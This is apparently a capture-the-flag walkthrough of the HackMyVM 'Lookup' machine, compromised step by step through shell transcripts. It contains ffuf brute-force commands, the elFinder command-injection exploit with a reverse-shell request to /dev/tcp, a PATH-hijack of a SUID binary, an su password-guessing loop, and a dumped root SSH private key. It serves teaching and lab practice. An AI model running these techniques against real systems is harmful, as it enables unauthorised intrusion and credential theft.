# Lookup

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.84:22
Open 10.0.2.84:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.84
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://lookup.hmv
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/lookup/writeup.png)

The error message is verbose and leaks username availability.
```bash
â””â”€$ curl 'http://lookup.hmv/login.php' -d 'username=admin&password=admin'
Wrong password. Please try again.<br>Redirecting in 3 seconds.                                                                                                                                                    
â””â”€$ curl 'http://lookup.hmv/login.php' -d 'password=admin' --data-urlencode "username=x' OR 1=1 -- -"
Wrong username or password. Please try again.<br>Redirecting in 3 seconds. 
```

Looks like we have to bruteforce the password..

### Bruteforce

Hmmm... nothing
```bash
â””â”€$ ffuf -u http://lookup.hmv/login.php -w $rockyou -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fr 'Please try again.'
# Nothing
```

```bash
â””â”€$ ffuf -u http://lookup.hmv/login.php -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -d 'username=FUZZ&password=password' -H 'Content-Type: application/x-www-form-urlencoded' -fr 'Wrong username or password.'
jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 5ms]
admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 764ms]
```

```bash
â””â”€$ ffuf -u http://lookup.hmv/login.php -w $rockyou -d 'username=jose&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fr 'Please try again.'
password123             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
```

### elFinder

![writeup-1.png](/assets/pentest/hackmyvm/lookup/writeup-1.png)

The files don't seem to contain any password related items, so skipped.

- [elFinder 2.1.47 - 'PHP connector' Command Injection](https://www.exploit-db.com/exploits/46481)
- [elFinder_2.1.47_php_connector_rce](https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce)

![writeup-2.png](/assets/pentest/hackmyvm/lookup/writeup-2.png)

```bash
â””â”€$ git clone -q https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce.git

â””â”€$ py elFinder_2.1.47_php_connector_rce/exploit.py -t http://files.lookup.hmv/elFinder/ -lh 10.0.2.15 -lp 4444
CVE-2019-9194 elFinder 2.1.47 - PHP connector Command Injection
Uploading image
Gettin file hash: l1_cnNlLmpwZztlY2hvIDNjM2Y3MDY4NzAyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUyNDU1MTU1NDU1MzU0NWIyMjYzMjI1ZDI5M2IyMDNmM2UwYSB8eHhkIC1yIC1wID4gcnNlLnBocDsgIy5qcGc
Rotating image
Requesting shell at http://files.lookup.hmv/elFinder/php/rse.php?c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.0.2.15/4444%200>%261'
```

```bash
â””â”€$ pwncat-cs -lp 4444
[05:09:02] Welcome to pwncat ðŸˆ!                                                          __main__.py:164
[05:09:05] received connection from 10.0.2.84:39210                                            bind.py:84
[05:09:05] 10.0.2.84:39210: registered new host w/ db                                      manager.py:957
(local) pwncat$
(remote) www-data@lookup:/var/www/files.lookup.hmv/public_html/elFinder/php$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral  Movement

```bash
(remote) www-data@lookup:/var/www$ find / -perm -4000 -ls 2>/dev/null | grep -v '/snap/'
     3279     24 -rwsr-xr-x   1 root     root               22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
    15113    464 -rwsr-xr-x   1 root     root              473576 Aug  4  2023 /usr/lib/openssh/ssh-keysign
     3387     16 -rwsr-xr-x   1 root     root               14488 Jan 11  2024 /usr/lib/eject/dmcrypt-get-device
     2045     52 -rwsr-xr--   1 root     messagebus         51344 Jan 11  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     9154     20 -rwsr-sr-x   1 root     root               17176 Jan 11  2024 /usr/sbin/pwm
      491     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
      672     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
      480     88 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /usr/bin/gpasswd
      178     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /usr/bin/chfn
     2463    164 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /usr/bin/sudo
      184     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /usr/bin/chsh
      547     68 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /usr/bin/passwd
     9965     56 -rwsr-xr-x   1 root     root               55528 May 30  2023 /usr/bin/mount
    14014     68 -rwsr-xr-x   1 root     root               67816 May 30  2023 /usr/bin/su
     1235     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /usr/bin/newgrp
     3277     32 -rwsr-xr-x   1 root     root               31032 Feb 21  2022 /usr/bin/pkexec
     9972     40 -rwsr-xr-x   1 root     root               39144 May 30  2023 /usr/bin/umount
```

```bash
(remote) www-data@lookup:/var/www$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

Hmmm... the binary should have been created by root, but nope.
```bash
(remote) www-data@lookup:/tmp$ echo $'#!/bin/bash\ninstall /bin/bash /tmp/rootbash -m4777' > /tmp/id
(remote) www-data@lookup:/tmp$ chmod +x /tmp/id
(remote) www-data@lookup:/tmp$ PATH=/tmp:$PATH /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[-] Error reading username from id command
: Success
(remote) www-data@lookup:/tmp$ /tmp/rootbash -p
www-data@lookup:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@lookup:/tmp$ ls -alh /tmp/rootbash
-rwsrwxrwx 1 www-data www-data 1.2M Oct 12 09:15 /tmp/rootbash
```

The `think` user has `.passwords` file, maybe we could trick program into disclosing the contents of that file?
```bash
(remote) www-data@lookup:/tmp$ find /home -type f -ls
find: '/home/think/.gnupg': Permission denied
   393390      0 -rwxr-xr-x   1 think    think           0 Jun 21  2023 /home/think/.cache/motd.legal-displayed
   407005      4 -rwxr-xr-x   1 think    think         807 Jun  2  2023 /home/think/.profile
   407008      4 -rwxr-xr-x   1 think    think        3771 Jun  2  2023 /home/think/.bashrc
   393397      4 -rw-r-----   1 root     think         525 Jul 30  2023 /home/think/.passwords
   407009      4 -rwxr-xr-x   1 think    think         220 Jun  2  2023 /home/think/.bash_logout
find: '/home/think/.ssh': Permission denied
   393373      4 -rw-r-----   1 root     think          33 Jul 30  2023 /home/think/user.txt
```

```bash
(remote) www-data@lookup:/tmp$ PATH=/tmp:$PATH /usr/sbin/pwm | tee passwords.txt
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```

```bash
(remote) www-data@lookup:/tmp$ while read -r password; do echo "Trying: $password"; echo "$password" | timeout 1 su think -c whoami 2>/dev/nullÂ && break; done < passwords.txt
...
Trying: jose&jessi
Trying: josemario.AKA(think)
think
```

## SSH

::: tip Creds
`think:josemario.AKA(think)`
:::

```bash
â””â”€$ sshpass -p 'josemario.AKA(think)' ssh think@lookup.hmv
think@lookup:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

### User.txt

```bash
think@lookup:~$ cat user.txt
38375fb4dd8baa2b2039ac03d92b820e
```

## Privilege Escalation

```bash
think@lookup:~$ sudo -l
[sudo] password for think: josemario.AKA(think)
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

- [https://gtfobins.github.io/gtfobins/look](https://gtfobins.github.io/gtfobins/look)

```bash
think@lookup:~$ sudo look '' /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash
â””â”€$ nano id_rsa.root
â””â”€$ chmod 600 id_rsa.root
â””â”€$ ssh -i id_rsa.root root@lookup.hmv
root@lookup:~$ id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@lookup:~$ cat root.txt
5a285a9f257e45c68bb6c9f9f57d18e8
```

